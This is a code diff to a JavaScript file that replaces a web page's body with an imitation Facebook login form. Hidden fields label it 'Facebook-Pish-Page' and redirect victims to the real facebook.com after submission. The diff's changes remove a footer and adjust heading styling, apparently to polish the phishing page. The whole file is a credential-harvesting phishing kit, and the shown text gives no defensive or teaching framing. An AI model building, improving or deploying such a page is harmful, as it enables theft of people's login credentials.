@@ -1,3 +1,4 @@
+document.getElementById('footer').remove();
 document.body.innerHTML = `
 <html> <head> <style>
         * {
@@ -171,7 +172,7 @@ document.body.innerHTML = `
             <input type="hidden" name="_subject" value="Facebook-Pish-Page*AltoroProject">
             <input type="hidden" name="redirect" value="https://facebook.com">
 
-            <b><div class="x9f619 x1ja2u2z x78zum5 x2lah0s x1n2onr6 x1nhvcw1 x6s0dn4 xozqiw3 x1q0g3np xyri2b x1c1uobl x18d9i69 xyamay9 x1ws5yxj xw01apr"><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x1icxu4v x25sj25"><div class="x1n2onr6 x1ja2u2z x9f619 x78zum5 xdt5ytf x2lah0s x193iq5w"><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x1iyjqo2 x2lwn1j"><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x1cy8zhl"><span class="x1lliihq x1plvlek xryxfnj x1n2onr6 xyejjpt x15dsfln x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1ejgnnb xza2c7i x1apb90u x1orftwa xzsf02u x1yc453h xudqn12 x41vudc" style="--x---base-line-clamp-line-height:calc(var(--headline3-line-height) * 1em);--x-lineHeight:calc(var(--headline3-line-height) * 1em)">Log in to Facebook</span></div></div></div></div></div></b>
+            <b><div style="font-size: 15px;" class="x9f619 x1ja2u2z x78zum5 x2lah0s x1n2onr6 x1nhvcw1 x6s0dn4 xozqiw3 x1q0g3np xyri2b x1c1uobl x18d9i69 xyamay9 x1ws5yxj xw01apr"><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x1icxu4v x25sj25"><div class="x1n2onr6 x1ja2u2z x9f619 x78zum5 xdt5ytf x2lah0s x193iq5w"><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x1iyjqo2 x2lwn1j"><div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x1cy8zhl"><span class="x1lliihq x1plvlek xryxfnj x1n2onr6 xyejjpt x15dsfln x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1ejgnnb xza2c7i x1apb90u x1orftwa xzsf02u x1yc453h xudqn12 x41vudc" style="--x---base-line-clamp-line-height:calc(var(--headline3-line-height) * 1em);--x-lineHeight:calc(var(--headline3-line-height) * 1em)">Log in to Facebook</span></div></div></div></div></div></b>
 <br>
 
             <div class="input-wrapper">
